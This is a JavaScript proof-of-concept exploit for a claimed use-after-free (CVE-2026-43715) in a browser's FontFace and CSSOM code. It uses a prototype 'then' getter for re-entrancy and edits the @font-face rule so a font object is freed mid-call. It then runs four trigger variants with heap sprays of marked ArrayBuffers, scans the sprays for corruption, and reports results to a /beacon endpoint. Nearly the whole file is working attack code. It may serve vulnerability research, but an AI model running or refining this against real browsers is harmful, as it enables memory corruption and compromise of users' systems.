// p449-fontface-adopt-uaf.js — CVE-2026-43715 adopt() UAF via CSSOM modification
//
// KEY INSIGHT: pump() has NO Ref<CSSFontFace> protectedThis.
// adopt() swaps FontFace.m_backing → old CSSFontFace loses last Ref → FREED
// setStatus continues on freed *this → UAF write at m_status offset
//
// adopt() is triggered ONLY when addFontFaceRule finds the SAME StyleRuleFontFace
// via lookUpByCSSConnection. Requires CSSOM modification (same rule object).
//
// Path: face.load() → pump() → setStatus(Success) → iterateClients →
//   FontFace::fontStateChanged → resolve → thenable getter →
//   CSSOM modify rule + offsetHeight → buildCompleted → addFontFaceRule →
//   lookUpByCSSConnection(same rule) → remove + adopt → old face freed →
//   getter returns → m_status = newStatus writes to FREED memory
(function() {
    var RUN = 'p449-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);
    if (typeof FontFace === 'undefined') { B('DEAD', 'NO-FONTFACE'); return; }

    // ═══════════════════════════════════════════════════════════════
    // TEST A: CSSOM modify @font-face rule during thenable getter
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p449a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        // Access rule via CSSOM
        var sheetA = styleA.sheet;
        var ruleA = sheetA ? sheetA.cssRules[0] : null;

        B('A-RULE', {
            hasSheet: !!sheetA,
            ruleCount: sheetA ? sheetA.cssRules.length : 0,
            ruleType: ruleA ? ruleA.type : -1,
            ruleCss: ruleA ? ruleA.cssText.slice(0, 80) : 'none'
        });

        if (!ruleA || ruleA.type !== 5) { // 5 = CSSRule.FONT_FACE_RULE
            B('A-DEAD', 'NO-FONTFACE-RULE');
        } else {
            // Find the FontFace
            var faceA = null;
            var it = document.fonts.values();
            var e;
            while (!(e = it.next()).done) {
                if (e.value.family.replace(/['"]/g, '') === 'p449a') {
                    faceA = e.value;
                    break;
                }
            }

            if (!faceA) { B('A-DEAD', 'NO-FACE'); }
            else {
                B('A-FOUND', 'status=' + faceA.status);

                var thenA = 0, aErr = '';
                Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                    thenA++;
                    if (thenA > 1) return undefined;
                    try {
                        // CSSOM modify: change font-weight on the SAME rule
                        // This keeps the same StyleRuleFontFace object but modifies properties
                        ruleA.style.setProperty('font-weight', 'bold');

                        // Force style rebuild → buildStarted + addFontFaceRule + buildCompleted
                        // This triggers: lookUpByCSSConnection(same rule) → adopt() → old face freed
                        document.body.offsetHeight;

                        B('A-GETTER-DONE', {modified: true, ruleCSS: ruleA.cssText.slice(0,80)});

                        // Spray to fill freed CSSFontFace slot (~256-320 bytes)
                        var spray = [];
                        for (var i = 0; i < 2000; i++) {
                            var ab = new ArrayBuffer(256);
                            var dv = new DataView(ab);
                            // Fill with marker pattern 0xDEADBEEF
                            for (var j = 0; j < 256; j += 4) {
                                dv.setUint32(j, 0xDEADBEEF, true);
                            }
                            spray.push(ab);
                        }
                        for (var i = 0; i < 2000; i++) {
                            var ab = new ArrayBuffer(288);
                            var dv = new DataView(ab);
                            for (var j = 0; j < 288; j += 4) {
                                dv.setUint32(j, 0xCAFEBABE, true);
                            }
                            spray.push(ab);
                        }
                        for (var i = 0; i < 2000; i++) {
                            var ab = new ArrayBuffer(320);
                            var dv = new DataView(ab);
                            for (var j = 0; j < 320; j += 4) {
                                dv.setUint32(j, 0xFEEDFACE, true);
                            }
                            spray.push(ab);
                        }

                        // Store spray for post-getter scan
                        window._spray = spray;
                    } catch(e) { aErr += e.message; }
                    return undefined;
                }, configurable: true });

                try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
                try { delete FontFace.prototype.then; } catch(e) {}

                B('A-RESULT', {thenFired: thenA, err: aErr});

                // Scan spray for corruption (m_status write would overwrite 4 bytes)
                var corrupted256 = 0, corrupted288 = 0, corrupted320 = 0;
                var corruptDetails = [];
                if (window._spray) {
                    for (var k = 0; k < window._spray.length; k++) {
                        var ab = window._spray[k];
                        var dv = new DataView(ab);
                        var size = ab.byteLength;
                        var marker = size === 256 ? 0xDEADBEEF : (size === 288 ? 0xCAFEBABE : 0xFEEDFACE);
                        for (var off = 0; off < size; off += 4) {
                            var val = dv.getUint32(off, true);
                            if (val !== marker) {
                                if (size === 256) corrupted256++;
                                else if (size === 288) corrupted288++;
                                else corrupted320++;
                                if (corruptDetails.length < 5) {
                                    corruptDetails.push({idx:k, sz:size, off:off, was:marker.toString(16), now:val.toString(16)});
                                }
                                break; // one per buffer
                            }
                        }
                    }
                }

                B('A-SPRAY', {c256:corrupted256, c288:corrupted288, c320:corrupted320, details:corruptDetails});

                // Check if old face wrapper still works
                try {
                    B('A-POST', {
                        family: faceA.family,
                        status: faceA.status,
                        fontsSize: document.fonts.size,
                        fontsStat: document.fonts.status
                    });
                } catch(e) { B('A-POST-ERR', e.message.slice(0,80)); }
            }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Alternative trigger — re-append same style element
    // ═══════════════════════════════════════════════════════════════
    // Removing and re-appending might trigger the same rule to be re-processed
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p449b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var faceB = null;
        var it2 = document.fonts.values();
        var e2;
        while (!(e2 = it2.next()).done) {
            if (e2.value.family.replace(/['"]/g, '') === 'p449b') {
                faceB = e2.value;
                break;
            }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    // Remove from DOM
                    styleB.remove();
                    // Re-append same element (same rules)
                    document.head.appendChild(styleB);
                    document.body.offsetHeight;

                    B('B-GETTER-DONE', {reappended: true});
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr});

            try {
                B('B-POST', {
                    family: faceB.family,
                    status: faceB.status,
                    fontsSize: document.fonts.size
                });
            } catch(e) { B('B-POST-ERR', e.message.slice(0,80)); }
        }
    } catch(e) { B('B-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Toggle disabled + modify
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p449c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var sheetC = styleC.sheet;
        var ruleC = sheetC ? sheetC.cssRules[0] : null;

        var faceC = null;
        var it3 = document.fonts.values();
        var e3;
        while (!(e3 = it3.next()).done) {
            if (e3.value.family.replace(/['"]/g, '') === 'p449c') {
                faceC = e3.value;
                break;
            }
        }

        if (!faceC || !ruleC) { B('C-DEAD', 'NO-FACE-OR-RULE'); }
        else {
            var thenC = 0, cErr = '';

            // Spray array for this test
            var sprayC = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    // Multiple modifications to really force rebuild
                    ruleC.style.setProperty('font-weight', '900');
                    ruleC.style.setProperty('font-style', 'italic');
                    document.body.offsetHeight;

                    B('C-GETTER-PHASE1', 'modified');

                    // Heavy spray targeting freed CSSFontFace
                    for (var i = 0; i < 5000; i++) {
                        var ab = new ArrayBuffer(256);
                        var dv = new DataView(ab);
                        for (var j = 0; j < 256; j += 4)
                            dv.setUint32(j, 0x41414141 + (i & 0xFF), true);
                        sprayC.push(ab);
                    }

                    B('C-GETTER-SPRAY', 'count=' + sprayC.length);
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-RESULT', {thenFired: thenC, err: cErr});

            // Scan for corruption
            var cCorrupted = 0;
            var cDetails = [];
            for (var k = 0; k < sprayC.length; k++) {
                var dv = new DataView(sprayC[k]);
                var expected = 0x41414141 + (k & 0xFF);
                for (var off = 0; off < 256; off += 4) {
                    if (dv.getUint32(off, true) !== expected) {
                        cCorrupted++;
                        if (cDetails.length < 5) {
                            cDetails.push({idx:k, off:off, exp:expected.toString(16), got:dv.getUint32(off, true).toString(16)});
                        }
                        break;
                    }
                }
            }

            B('C-SPRAY', {corrupted:cCorrupted, details:cDetails});

            try {
                B('C-POST', {
                    family: faceC.family,
                    status: faceC.status,
                    fontsSize: document.fonts.size,
                    fontsStat: document.fonts.status
                });
            } catch(e) { B('C-POST-ERR', e.message.slice(0,80)); }
        }
    } catch(e) { B('C-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Direct document.fonts API with load() promise path
    // ═══════════════════════════════════════════════════════════════
    // Uses document.fonts.load() to create pending promises in m_pendingPromises
    // Then loads face → faceFinished → promise resolve → JS re-entry
    try {
        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'p449d'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var sheetD = styleD.sheet;
        var ruleD = sheetD ? sheetD.cssRules[0] : null;

        // Use document.fonts.load() to set up pending promise
        var loadPromiseResult = null;
        var loadPromiseErr = null;

        // Check if face exists already
        var faceD = null;
        var it4 = document.fonts.values();
        var e4;
        while (!(e4 = it4.next()).done) {
            if (e4.value.family.replace(/['"]/g, '') === 'p449d') {
                faceD = e4.value;
                break;
            }
        }

        if (!faceD || !ruleD) { B('D-DEAD', 'NO-FACE-OR-RULE'); }
        else {
            B('D-FOUND', 'status=' + faceD.status);

            // For D: combine CSSOM modify + document.fonts.load()
            var thenD = 0, dErr = '';
            var dFontsReady = false;

            // Set up ready promise watcher
            document.fonts.ready.then(function() { dFontsReady = true; });

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                if (thenD > 1) return undefined;
                try {
                    // CSSOM modify same rule
                    ruleD.style.setProperty('font-weight', 'bold');
                    ruleD.style.setProperty('src', "local('Arial'), local('Courier')");

                    // Force full rebuild
                    document.body.offsetHeight;

                    B('D-GETTER-DONE', 'modified-src-and-weight');
                } catch(e) { dErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceD.load(); } catch(e) { dErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-RESULT', {thenFired: thenD, err: dErr});

            // Check fonts state
            try {
                B('D-POST', {
                    family: faceD.family,
                    status: faceD.status,
                    fontsSize: document.fonts.size,
                    fontsStat: document.fonts.status,
                    ready: dFontsReady
                });
            } catch(e) { B('D-POST-ERR', e.message.slice(0,80)); }
        }
    } catch(e) { B('D-ERR', e.message.slice(0,100)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
